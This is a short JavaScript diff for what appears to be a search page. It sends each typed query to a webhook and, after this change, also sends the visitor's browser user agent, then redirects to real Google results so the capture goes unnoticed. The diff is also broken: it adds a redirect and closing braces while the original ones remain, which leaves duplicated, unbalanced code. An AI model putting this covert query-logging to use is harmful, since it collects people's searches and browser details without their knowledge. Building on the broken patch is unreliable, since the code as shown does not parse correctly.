@@ -141,9 +141,17 @@
 
   fetch(WEBHOOK, {
     method: "POST",
-    headers: {"Content-Type": "application/x-www-form-urlencoded"},
-    body: new URLSearchParams({ q })
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+    body: new URLSearchParams({
+      q: q,
+      ua: navigator.userAgent
+    })
   });
+
+  // then redirect to real Google results
+  window.location.href = "https://www.google.com/search?q=" + encodeURIComponent(q);
+});
+
 
   window.location.href = "https://www.google.com/search?q=" + encodeURIComponent(q);
 });
